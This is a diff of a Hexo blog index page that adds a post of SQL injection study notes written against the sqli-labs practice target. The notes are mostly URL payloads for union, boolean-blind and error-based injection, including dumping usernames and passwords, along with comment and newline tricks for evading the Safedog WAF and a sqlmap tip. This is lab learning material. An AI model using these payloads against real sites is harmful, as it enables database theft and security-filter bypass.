@@ -197,7 +197,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -239,6 +239,92 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://tingqiao.github.io/posts/5a68b32e/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="听桥">
+      <meta itemprop="description" content="啥也不是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TingQiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/5a68b32e/" class="post-title-link" itemprop="url">MySQL注入总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-12-07 23:07:44 / 修改时间：23:15:04" itemprop="dateCreated datePublished" datetime="2020-12-07T23:07:44+08:00">2020-12-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="基于sqli注入及绕过学习总结"><a href="#基于sqli注入及绕过学习总结" class="headerlink" title="基于sqli注入及绕过学习总结"></a>基于sqli注入及绕过学习总结</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>靶场：sqli-labs<br>数据库：MySQL<br>防护：安全狗  </p>
+<h3 id="Mysql基础"><a href="#Mysql基础" class="headerlink" title="Mysql基础"></a>Mysql基础</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">当前数据库：database()</span><br><span class="line">当前用户名称：user()  system_user()</span><br><span class="line">数据库版本：version() @@version</span><br><span class="line">数据路径：@@datadir</span><br><span class="line">Mysql可以使用的空白字符：</span><br><span class="line">%09</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%20</span><br><span class="line">%a0</span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">Mysql可以使用的注释符号：<span class="comment">#,--,/*comment*/,/*! MYSQL Special SQL */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在SQL语句的中间，可以自由地加入空格或换行符，例如以下语句是可以被正确执行的。</p>
+<p><img src="/posts/5a68b32e/res/2020-12-07-23-12-25.png" alt="1"></p>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line"></span><br><span class="line">?id=1&#x27;   <span class="comment">#&#x27;单引号判断注入存在</span></span><br><span class="line"></span><br><span class="line">?id=1&#x27;order+by+5<span class="comment">--+ #判断列数</span></span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+ #判断输出位置</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union+select+1,database(),3--+ #当前数据库名称</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">schema</span>(),<span class="number">3</span><span class="comment">--+ #当前数据库名称</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;+union+select+1,a(),3--+ #报错出库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+ #当前用户名称</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union+select+1,system_user(),3--+ #当前用户名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">version</span>(),<span class="number">3</span><span class="comment">--+ #数据库版本</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union+select+1,@@version,3--+ #数据库版本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,@@datadir,<span class="number">3</span><span class="comment">--+ #数据路径</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union+select+1,group_concat(schema_name),3+from+information_schema.schemata--+ #爆出数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="string">&#x27;security&#x27;</span><span class="comment">--+ #爆出某数据库所有表名</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27;--+ #爆出某表列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>+<span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,username,<span class="keyword">password</span>+<span class="keyword">from</span>+<span class="keyword">users</span>+<span class="keyword">where</span>+<span class="keyword">id</span>=<span class="number">2</span><span class="comment">--+ #爆出某表的数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="联合查询注入绕过姿势"><a href="#联合查询注入绕过姿势" class="headerlink" title="联合查询注入绕过姿势"></a>联合查询注入绕过姿势</h4><h5 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">?id=1&#x27; <span class="comment">#单引号不拦截</span></span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">?id=1&#x27;+order+by+1<span class="comment">--+                #拦截order by</span></span><br><span class="line">?id=&#x27;<span class="comment">/*!24410order+By*/</span>+5<span class="comment">--+        #绕过fuzz5位数字</span></span><br><span class="line">?id=1&#x27;<span class="comment">/*!50000order%23%0aBy*/</span>+5<span class="comment">--+  #绕过%23%0a</span></span><br><span class="line">?id=1&#x27;order%23%0aBy+5<span class="comment">--+            #绕过%23%0a</span></span><br><span class="line">?id=1&#x27;/*!order+/*!/*/**/by*/4--+    #乱七八糟没看懂绕过 /*!*/ /**/</span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a>union select绕过</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">?id=-1&#x27;+div+1+union%23foo*%2F*bar%0D%0Aselect+1,2,3--+  #绕过利用%23%0a</span><br><span class="line">?id=-1&#x27;union%23foo*%2F*bar%0D%0Aselect+1,2,3--+ #绕过利用%23%0a</span><br><span class="line">?id=-1&#x27;union%23*%2F*bar%0D%0Aselect+1,2,3--+    #绕过利用%23%0a</span><br><span class="line">?id=-1&#x27;union%23xxx%0D%0Aselect+1,2,3<span class="comment">--+ #绕过利用%23%0a</span></span><br><span class="line">?id=-1&#x27;union%23xxx%23%0aselect+1,2,3<span class="comment">--+ #绕过利用%23%0a</span></span><br><span class="line">?id=-1&#x27;union%23xxx%0aselect+1,2,3<span class="comment">--+    #绕过利用%23xxx%0a</span></span><br><span class="line">?id=-1&#x27;<span class="comment">/*!union*/</span><span class="comment">--+xxx%0Aselect+1,2,3+%23  #绕过利用/*!*/ --+xxx%0A</span></span><br><span class="line">?id=-1&#x27;union<span class="comment">--+xxx%0Aselect+1,2,3+%23   #绕过利用--+xxx%0A</span></span><br><span class="line">?id=-1&#x27;union+<span class="comment">/*!44000select*/</span>+1,2,3<span class="comment">--+  #绕过利用/*!*/内联注释</span></span><br><span class="line">?id=<span class="comment">/*-1&#x27;union+select+1,2,3--+*/</span>    <span class="comment">#绕过利用/*直接注*/</span></span><br><span class="line">?id=-1&#x27;+union/*!/*/**/*/select/*!/*/**/*/1,2,3--+  #绕过利用/*!/*/**/*/       */</span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">union <span class="keyword">select</span>出数据绕过：</span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union%23xxx%0aselect+1,database%23xxx%0a(),3--+  #database() 绕过%23xxx%0a</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="comment">/*!union*/</span><span class="comment">--+xxx%0Aselect+1,database--+xxx%0A(),3+%23    #绕过利用/*!*/ --+xxx%0A</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union--+xxx%0Aselect+1,database--+xxx%0A(),3+%23 #绕过利用--+xxx%0A</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>+<span class="comment">/*!44000select*/</span>+<span class="number">1</span>,<span class="keyword">database</span><span class="comment">--+xxx%0A(),3--+    #绕过利用/*!*/内联注释database()</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="comment">/*-1&#x27;union+select+1,database(),3--+*/</span>   <span class="comment">#绕过利用/*直接注*/</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;+union%23xxx%0aselect+1,database/*!/*/**/*/(),3--+   #绕过利用%23xxx%0,/*!/*/**/*/</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>+<span class="keyword">union</span><span class="comment">/*!/*/</span>**<span class="comment">/*/select+1,database/*!/*/</span>**<span class="comment">/*/(),3--+ #绕过利用/*!/*/</span>**<span class="comment">/*/       */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union%23xxx%0aselect+1,group_concat(schema_name),3+from%23xxx%0ainformation_schema.schemata--+   #读库名绕过%23xxx%0a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>%<span class="number">23</span>xxx%<span class="number">0</span>aselect+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>+<span class="keyword">from</span>%<span class="number">23</span>xxx%<span class="number">0</span>ainformation_schema.tables+<span class="keyword">where</span>+table_schema=<span class="string">&#x27;security&#x27;</span><span class="comment">--+    #爆出某数据库所有表名   绕过%23%0a</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;union/*!/*/**/*/select+1,group_concat(table_name),3+from/*!/*/**/*/information_schema.tables+where+table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27;--+    #爆出某数据库所有表名   绕过/*!/*/**/*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">union</span>%<span class="number">23</span>xxx%<span class="number">0</span>aselect+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>+<span class="keyword">from</span>%<span class="number">23</span>xxx%<span class="number">0</span>ainformation_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">&#x27;users&#x27;</span><span class="comment">--+   #爆出某表列名 绕过%23%0a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27;+union%23xxx%0aselect+1,username,password+from%23xxx%0ausers+where+id=3--+   #爆出某表的数据</span></span><br><span class="line"><span class="string">--------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="information-schema禁用绕过"><a href="#information-schema禁用绕过" class="headerlink" title="information_schema禁用绕过"></a>information_schema禁用绕过</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">mysql5.7版本之后：</span><br><span class="line">    sys.schema_auto_increment_columns <span class="comment">#存放了非系统库的表名</span></span><br><span class="line">    sys.schema_table_statistics_with_buffer <span class="comment">#另一个存放了非系统库的表名</span></span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注姿势"><a href="#盲注姿势" class="headerlink" title="盲注姿势"></a>盲注姿势</h4><h5 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;&#x27;</span><span class="keyword">and</span>+<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;and+1=1--+    #检测语句</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span>+<span class="number">1</span>=<span class="number">2</span><span class="comment">--+    #检测语句</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;and+left(version(),1)=5--+        #查看版本</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span>+<span class="keyword">left</span>(<span class="keyword">version</span>(),<span class="number">6</span>)=<span class="string">&#x27;5.5.53&#x27;</span><span class="comment">--+ #查看版本</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;and+left(database(),1)=&#x27;</span>s<span class="string">&#x27;--+     #查看数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span>+<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span><span class="comment">--+ #ascii查找表名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span>?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),1,1))&gt;113--+ #ascii查找第二个表表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>+<span class="keyword">and</span>+<span class="number">1</span>=(<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">&#x27;users&#x27;</span>+<span class="keyword">and</span>+table_name+regexp+<span class="string">&#x27;^us[a-z]&#x27;</span>+<span class="keyword">limit</span>+<span class="number">1</span>,<span class="number">1</span>)<span class="comment">--+  #regexp查字段名</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;+and+1=(select+1+from+information_schema.columns+where+table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27;+and+column_name+regexp+&#x27;</span>^username<span class="string">&#x27;+limit+0,1)--+ #regexp查字段名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>+<span class="keyword">and</span>+<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span>+<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username+<span class="keyword">AS</span>+<span class="built_in">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span>+security.users+<span class="keyword">ORDER</span>+<span class="keyword">BY</span>+<span class="keyword">id</span>+<span class="keyword">LIMIT</span>+<span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span><span class="comment">--+ #读数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;+union+<span class="keyword">select</span>+(<span class="keyword">exp</span>(~(<span class="keyword">select</span>+*+<span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span>())a))),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+  #exp报错注入 mysql 5.5.5~5.5.49</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;+union+select+(!(select+*+from+(select+user())x)+-+~0),2,3--+ # bigint 溢出进行报错注入</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="奇葩绕过姿势"><a href="#奇葩绕过姿势" class="headerlink" title="奇葩绕过姿势"></a>奇葩绕过姿势</h3><h4 id="FUZZ-XFF头绕过"><a href="#FUZZ-XFF头绕过" class="headerlink" title="FUZZ XFF头绕过"></a>FUZZ XFF头绕过</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x-forwarded-for</span>: 157.56.1.1</span><br></pre></td></tr></table></figure>
+
+<h4 id="安全狗-sqlmap-直接注入"><a href="#安全狗-sqlmap-直接注入" class="headerlink" title="安全狗 sqlmap 直接注入"></a>安全狗 sqlmap 直接注入</h4><p>添加/***/直接跑：<br><a target="_blank" rel="noopener" href="http://192.168.107.128/sqli/Less-1/?id=1/***/">http://192.168.107.128/sqli/Less-1/?id=1/%2a*%2a/</a>  </p>
+<h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1008,98 +1094,9 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://tingqiao.github.io/posts/4a17b156/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="听桥">
-      <meta itemprop="description" content="啥也不是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TingQiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/4a17b156/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-11-27 11:19:06" itemprop="dateCreated datePublished" datetime="2020-11-27T11:19:06+08:00">2020-11-27</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-01 23:21:20" itemprop="dateModified" datetime="2020-12-01T23:21:20+08:00">2020-12-01</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Hexo/" itemprop="url" rel="index"><span itemprop="name">Hexo</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 <script>
